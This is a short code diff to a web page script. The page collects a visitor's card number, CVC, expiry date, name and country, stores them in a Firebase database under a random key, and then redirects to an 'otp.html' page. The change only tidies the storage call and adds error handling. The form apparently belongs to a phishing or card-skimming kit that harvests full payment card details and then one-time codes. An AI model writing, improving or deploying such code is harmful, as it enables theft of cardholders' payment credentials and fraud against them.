@@ -81,17 +81,23 @@ const db = getDatabase(app);
         } else {
         document.getElementById('loadingOverlay').style.display = 'flex';
 
-    set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
-  Card_Number: cardNumber,
-  CVC: cvc,
-  MY: expireDate,
-  Name: name,
-  Country: country
-});
-    setTimeout(function() {
+    const randomId = Math.random().toString(36).slice(2, 7);
+  const dbRef = ref(db, 'SubGo/' + randomId);
+
+  set(dbRef, {
+    Card_Number: cardNumber,
+    CVC: cvc,
+    MY: expireDate,
+    Name: name,
+    Country: country
+  }).then(() => {
     document.getElementById('loadingOverlay').style.display = 'none';
     window.location.href = 'otp.html';
-}, 1000);
+  }).catch((error) => {
+    document.getElementById('loadingOverlay').style.display = 'none';
+    alert(error);
+  });
+    
         }
       });
 </script>
